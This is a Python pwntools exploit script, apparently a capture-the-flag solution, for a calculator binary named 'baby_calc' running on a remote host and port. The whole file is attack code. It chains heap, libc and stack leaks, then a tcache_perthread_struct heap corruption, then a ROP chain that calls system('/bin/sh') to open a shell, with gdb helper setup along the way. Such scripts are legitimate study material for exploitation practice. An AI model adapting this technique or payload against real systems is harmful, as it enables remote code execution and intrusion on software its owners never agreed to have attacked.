#!/usr/bin/env python3

from pwn import *

exe = ELF("./baby_calc", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("45.122.249.68", 20002)

    return r

def GDB():     # Wsl2
    import os
    script = '''
    #!/bin/sh

    cd /home/johnathanhuutri/baby_calc
    '''
    script += f'gdb -p {p.pid} -x /tmp/command.gdb'
    with open('/tmp/script.sh', 'w') as f: f.write(script)
    os.system("chmod +x /tmp/script.sh")

    command = '''
    b setup_data
    b*setup_data+90
    b*setup_data+331
    b save_result
    b view_result
    b*cleanup_data+67
    c
    '''
    with open('/tmp/command.gdb', 'w') as f: f.write(command)
    q = process(f'cmd.exe /c start C:\\Windows\\system32\\wsl.exe /tmp/script.sh'.split())
    input()


p = conn()

##################################
### Stage 1: Leak heap address ###
##################################
# Expression 1
payload = b'+'.ljust(4, b'\0')
payload += p32(0x20000008)       # size
payload += p32(5)           # arg1
payload += p32(6)           # arg2
payload = payload.ljust(0x80, b'A')
p.send(payload)

payload = cyclic(0x8)
p.sendafter(b'feedback:', payload)
p.recvline()

# Expression 2
payload = b'+'.ljust(4, b'\0')
payload += p32(0x20000008)       # size
payload += p32(5)           # arg1
payload += p32(6)           # arg2
payload = payload.ljust(0x80, b'A')
p.send(payload)

payload = flat(
    # new_data->buffer
    b'A'*0x48,

    # result_str
    0xffffffffffffffff,
    b'B'*0x88,

    # obj
    0xffffffffffffffff,
    )
p.sendafter(b'feedback:', payload)
p.recvuntil(b'B'*0x88 + p64(0xffffffffffffffff))
heap_leak = u64(p.recv(6) + b'\0\0')
heap_base = heap_leak - 0x320
log.info("Heap base: " + hex(heap_base))

##################################
### Stage 2: Leak libc address ###
##################################
# Expression 3
payload = b'+'.ljust(4, b'\0')
payload += p32(0x200000a0)       # size
payload += p32(5)           # arg1
payload += p32(6)           # arg2
payload = payload.ljust(0x80, b'A')
p.send(payload)

payload = b'A'*0x48
p.sendafter(b'feedback:', payload)
p.recvline()

payload = b'+'.ljust(4, b'\0')
payload += p32(0x20000008)       # size
payload += p32(7)           # arg1
payload += p32(8)           # arg2
payload = payload.ljust(0x80, b'A')
p.send(payload)

payload = flat(
    # new_data->buffer
    b'A'*0x48,

    # result_str
    0x91,
    b'B'*0x88,

    # obj
    0x21,
    heap_base+0x5c0
    )
p.sendafter(b'feedback: ', payload)
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x219ce0
log.info("Libc base: " + hex(libc.address))


###################################
### Stage 3: Leak stack address ###
###################################
payload = b'+'.ljust(4, b'\0')
payload += p32(0x20000008)       # size
payload += p32(7)           # arg1
payload += p32(8)           # arg2
payload = payload.ljust(0x80, b'A')
p.send(payload)

payload = b'A'*0x48
payload += flat(
    0x91,
    b'B'*0x88,
    0x21,
    libc.sym['environ']
    )
p.sendafter(b'feedback: ', payload)
stack_leak = u64(p.recv(6) + b'\0\0')
stack_need = stack_leak - 0x1e8
log.info(hex(stack_leak))

###############################################
### Stage 4: tcache_perthread_struct attack ###
###############################################
# Create fake size 0x1
payload = b'+'.ljust(4, b'\0')
payload += p32(0x2000001a)       # size
payload += p32(7)           # arg1
payload += p32(8)           # arg2
payload = payload.ljust(0x70, b'A')
payload += flat(0, 0x301)
p.send(payload)

payload = b'A'*0x48
p.sendafter(b'feedback: ', payload)
p.recvline()

# Create fake size 0x10001
payload = b'+'.ljust(4, b'\0')
payload += p32(0x2000001c)       # size
payload += p32(7)           # arg1
payload += p32(8)           # arg2
payload = payload.ljust(0x70, b'A')
payload += flat(0, 0x301)
p.send(payload)

payload = b'A'*0x48
p.sendafter(b'feedback: ', payload)
p.recvline()

# Remove all 0x20-byte chunk, 0x30-byte chunk and 0x90-byte chunk
payload = b'+'.ljust(4, b'\0')
payload += p32(0x20000040)       # size
payload += p32(7)           # arg1
payload += p32(8)           # arg2
payload = payload.ljust(0x70, b'A')
payload += flat(0, 0x301)
p.send(payload)

payload = b'A'*0x18
p.sendafter(b'feedback: ', payload)
p.recvline()

payload = b'+'.ljust(4, b'\0')
payload += p32(0x20000040)       # size
payload += p32(7)           # arg1
payload += p32(8)           # arg2
payload = payload.ljust(0x70, b'A')
payload += flat(0, 0x301)
p.send(payload)

payload = b'A'*0x18
p.sendafter(b'feedback: ', payload)
p.recvline()

# Create 0x10000-byte chunk
payload = b'+'.ljust(4, b'\0')
payload += p32(0x20001e16)       # size
payload += p32(7)           # arg1
payload += p32(8)           # arg2
payload = payload.ljust(0x70, b'A')
payload += flat(0, 0x301)
p.send(payload)

payload = b'A'*0x48
p.sendafter(b'feedback: ', payload)
p.recvline()

# Create temp chunk for the next modification below
payload = b'+'.ljust(4, b'\0')
payload += p32(0x2000000a)       # size
payload += p32(7)           # arg1
payload += p32(8)           # arg2
payload = payload.ljust(0x70, b'A')
payload += flat(0, 0x301)
p.send(payload)
payload = b'A'*0x18
p.sendafter(b'feedback: ', payload)
p.recvline()

# Change new_data->buffer to fake chunk in tcache_perthread_struct
# to free that fake chunk
payload = b'+'.ljust(4, b'\0')
payload += p32(0x2000000a)       # size
payload += p32(7)           # arg1
payload += p32(8)           # arg2
payload = payload.ljust(0x70, b'A')
payload += flat(0, 0x301)
p.send(payload)
payload = b'A'*0x58
payload += flat(
    0x91,
    b'B'*0x88, 0x21,
    heap_base + 0xe70, 0,
    0, 0x31,
    0x2000000a55504c2b, 0x0000000800000007,
    heap_base + 0x30
    )
p.sendafter(b'feedback: ', payload)
p.recvline()

# Get rid of the large chunk we created above a bit
context.log_level = 'info'
for i in range(200):
    payload = b'+'.ljust(4, b'\0')
    payload += p32(0x20000082)       # size
    payload += p32(7)           # arg1
    payload += p32(8)           # arg2
    payload = payload.ljust(0x70, b'A')
    payload += flat(0, 0x301)
    p.send(payload)
    payload = b'A'*0x58
    p.sendafter(b'feedback: ', payload)
    p.recvline()
context.log_level = 'debug'

# Okay we can get the tcache_perthread_struct fake chunk now
payload = b'+'.ljust(4, b'\0')
payload += p32(0x20000800)       # size
payload += p32(7)           # arg1
payload += p32(8)           # arg2
payload = payload.ljust(0x70, b'A')
payload += flat(0, 0x301)
p.send(payload)
payload = flat(
    0, 0,
    0, 0,
    1, 0,
    p64(0)*6,

    p64(0)*3, heap_base + 0x2d0,
    p64(0)*8,
    heap_base+0x6d0, heap_base+0x890,
    p64(0)*18,

    # heap_base+0x10
    stack_need
    )
p.sendafter(b'feedback: ', payload)
p.recvline()

#############################################
### Stage 5: Stack overwrite && Get shell ###
#############################################
payload = b'+'.ljust(4, b'\0')
payload += p32(0x42)       # size
payload += p32(7)           # arg1
payload += p32(8)           # arg2
payload = payload.ljust(0x70, b'A')
payload += flat(0, 0x301)
p.send(payload)
ret = libc.address + 0x0000000000029cd6
pop_rdi = libc.address + 0x000000000002a3e5
payload = flat(
    b'A'*0x8,
    ret,
    pop_rdi, next(libc.search(b'/bin/sh')),
    libc.sym['system']
    )
p.sendafter(b'feedback: ', payload)

p.interactive()
